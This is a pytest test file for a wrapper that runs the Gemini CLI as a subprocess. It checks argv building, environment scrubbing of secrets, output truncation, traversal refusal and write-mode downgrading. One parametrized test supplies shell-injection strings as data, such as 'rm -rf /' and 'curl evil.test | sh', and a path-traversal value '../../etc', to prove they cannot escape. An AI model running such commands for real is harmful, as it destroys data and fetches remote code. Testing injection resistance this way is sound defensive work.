"""Tests for the Gemini CLI wrapper.

The CLI binary is not installed in CI, so the subprocess boundary is stubbed.
What is tested for real is the part that would hurt if it were wrong: the exact
argv, the scrubbed child environment, and the output handling.
"""

from __future__ import annotations

import subprocess

import pytest

from gemini_cli_agent.config import config
from gemini_cli_agent.constants import StateKeys
from gemini_cli_agent.tools.gemini_cli import (
    build_child_env,
    build_cli_argv,
    check_gemini_cli,
    run_gemini_cli,
    truncate_output,
)


# --- argv construction -------------------------------------------------
def test_argv_passes_the_prompt_as_a_single_argument():
    """The prompt must be one argv entry; there is no shell to quote it for."""
    argv = build_cli_argv("explain this codebase")
    assert argv[-2:] == ["-p", "explain this codebase"]


def test_argv_includes_the_model():
    argv = build_cli_argv("task", model="gemini-2.5-flash")
    assert argv[argv.index("-m") + 1] == "gemini-2.5-flash"


def test_argv_omits_yolo_when_writes_are_disabled():
    assert "--yolo" not in build_cli_argv("task", allow_write=False)


def test_argv_includes_yolo_only_when_writes_are_enabled():
    assert "--yolo" in build_cli_argv("task", allow_write=True)


@pytest.mark.parametrize(
    "prompt",
    [
        "task; rm -rf /",
        "task && curl evil.test | sh",
        "task `id`",
        "task $(whoami)",
        'task " ; echo pwned',
        "task\nrm -rf /",
    ],
)
def test_prompt_metacharacters_stay_inside_one_argv_entry(prompt):
    """A prompt is data. With shell=False, nothing in it can become a command."""
    argv = build_cli_argv(prompt)
    assert argv.count(prompt) == 1
    assert argv[-1] == prompt
    # No other entry was split out of the prompt.
    assert all(prompt not in entry for entry in argv[:-1])


def test_extra_directories_are_passed_as_separate_flags():
    argv = build_cli_argv("task", extra_directories=["src", "tests"])
    assert argv.count("--include-directories") == 2
    assert "src" in argv and "tests" in argv


# --- environment scrubbing --------------------------------------------
def test_child_env_passes_through_credentials(monkeypatch):
    monkeypatch.setenv("GOOGLE_API_KEY", "key-123")
    monkeypatch.setenv("GOOGLE_CLOUD_PROJECT", "proj")
    env = build_child_env()
    assert env["GOOGLE_API_KEY"] == "key-123"
    assert env["GOOGLE_CLOUD_PROJECT"] == "proj"


def test_child_env_drops_unrelated_secrets(monkeypatch):
    """The CLI gets what it needs and nothing else."""
    monkeypatch.setenv("DATABASE_PASSWORD", "hunter2")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "leak-me")
    monkeypatch.setenv("MY_PRIVATE_TOKEN", "nope")
    env = build_child_env()
    assert "DATABASE_PASSWORD" not in env
    assert "AWS_SECRET_ACCESS_KEY" not in env
    assert "MY_PRIVATE_TOKEN" not in env


def test_child_env_marks_the_run_non_interactive():
    env = build_child_env()
    assert env["CI"] == "true"
    assert env["TERM"] == "dumb"


# --- output handling ---------------------------------------------------
def test_short_output_is_untouched():
    text, truncated = truncate_output("short", limit=1000)
    assert text == "short"
    assert truncated is False


def test_long_output_is_truncated_within_the_cap():
    text, truncated = truncate_output("x" * 5000, limit=1000)
    assert truncated is True
    # The elision marker adds a little; the point is it is bounded, not 5000.
    assert len(text) < 1400


def test_truncation_keeps_the_head_and_the_tail():
    """The head holds the summary, the tail the conclusion; lose the middle."""
    source = "HEAD" + ("m" * 5000) + "TAIL"
    text, _ = truncate_output(source, limit=600)
    assert text.startswith("HEAD")
    assert text.endswith("TAIL")
    assert "elided by the agent" in text


# --- run_gemini_cli ---------------------------------------------------
async def test_empty_task_is_rejected_before_any_subprocess(tool_context):
    result = await run_gemini_cli("   ", "any-workspace", tool_context)
    assert result["status"] == "error"
    assert "empty" in result["message"].lower()


async def test_missing_cli_is_reported_as_an_environment_problem(
    tool_context, monkeypatch, fake_workspace
):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: None
    )
    result = await run_gemini_cli("task", fake_workspace.workspace_id, tool_context)
    assert result["status"] == "error"
    assert "npm install" in result["message"]


async def test_unknown_workspace_is_reported_clearly(tool_context, monkeypatch):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: "/usr/bin/gemini"
    )
    result = await run_gemini_cli("task", "no-such-workspace", tool_context)
    assert result["status"] == "error"
    assert "no-such-workspace" in result["message"]


async def test_traversal_in_subdirectory_is_refused(
    tool_context, monkeypatch, fake_workspace
):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: "/usr/bin/gemini"
    )
    result = await run_gemini_cli(
        "task", fake_workspace.workspace_id, tool_context, subdirectory="../../etc"
    )
    assert result["status"] == "error"
    assert "outside the workspace" in result["message"]


async def test_successful_run_records_an_audit_entry(
    tool_context, monkeypatch, fake_workspace
):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: "/usr/bin/gemini"
    )
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: subprocess.CompletedProcess(
            args=a[0] if a else [], returncode=0, stdout="The findings.", stderr=""
        ),
    )

    result = await run_gemini_cli(
        "explain src/", fake_workspace.workspace_id, tool_context, subdirectory="src"
    )

    assert result["status"] == "success"
    assert result["output"] == "The findings."
    runs = tool_context.state[StateKeys.CLI_RUNS]
    assert len(runs) == 1
    assert runs[0]["task"] == "explain src/"
    assert runs[0]["subdirectory"] == "src"


async def test_nonzero_exit_is_surfaced_with_the_code(
    tool_context, monkeypatch, fake_workspace
):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: "/usr/bin/gemini"
    )
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: subprocess.CompletedProcess(
            args=[], returncode=2, stdout="", stderr="quota exceeded"
        ),
    )
    result = await run_gemini_cli("task", fake_workspace.workspace_id, tool_context)
    assert result["status"] == "error"
    assert result["exit_code"] == 2
    assert "quota exceeded" in result["message"]


async def test_timeout_suggests_narrowing_the_task(
    tool_context, monkeypatch, fake_workspace
):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: "/usr/bin/gemini"
    )

    def raise_timeout(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd="gemini", timeout=600)

    monkeypatch.setattr(subprocess, "run", raise_timeout)
    result = await run_gemini_cli("task", fake_workspace.workspace_id, tool_context)
    assert result["error_type"] == "timeout"
    assert "narrow" in result["message"].lower()


async def test_empty_cli_output_is_an_error_not_a_silent_success(
    tool_context, monkeypatch, fake_workspace
):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: "/usr/bin/gemini"
    )
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: subprocess.CompletedProcess(
            args=[], returncode=0, stdout="   \n", stderr=""
        ),
    )
    result = await run_gemini_cli("task", fake_workspace.workspace_id, tool_context)
    assert result["error_type"] == "empty_output"


async def test_write_request_is_downgraded_when_the_deployment_forbids_it(
    tool_context, monkeypatch, fake_workspace
):
    """The caller asks for writes; the deployment setting wins."""
    monkeypatch.setattr(config, "gemini_cli_allow_write", False)
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: "/usr/bin/gemini"
    )
    captured: dict[str, object] = {}

    def capture(argv, **kwargs):
        captured["argv"] = argv
        return subprocess.CompletedProcess(args=argv, returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(subprocess, "run", capture)

    result = await run_gemini_cli(
        "edit the file", fake_workspace.workspace_id, tool_context, allow_write=True
    )

    assert result["write_enabled"] is False
    assert "--yolo" not in captured["argv"]


# --- check_gemini_cli -------------------------------------------------
def test_check_reports_absence_with_install_instructions(monkeypatch):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: None
    )
    result = check_gemini_cli()
    assert result["available"] is False
    assert "npm install" in result["message"]


def test_check_reports_the_version_when_present(monkeypatch):
    monkeypatch.setattr(
        "gemini_cli_agent.tools.gemini_cli.gemini_cli_path", lambda: "/usr/bin/gemini"
    )
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: subprocess.CompletedProcess(
            args=[], returncode=0, stdout="0.4.1\n", stderr=""
        ),
    )
    result = check_gemini_cli()
    assert result["available"] is True
    assert result["version"] == "0.4.1"
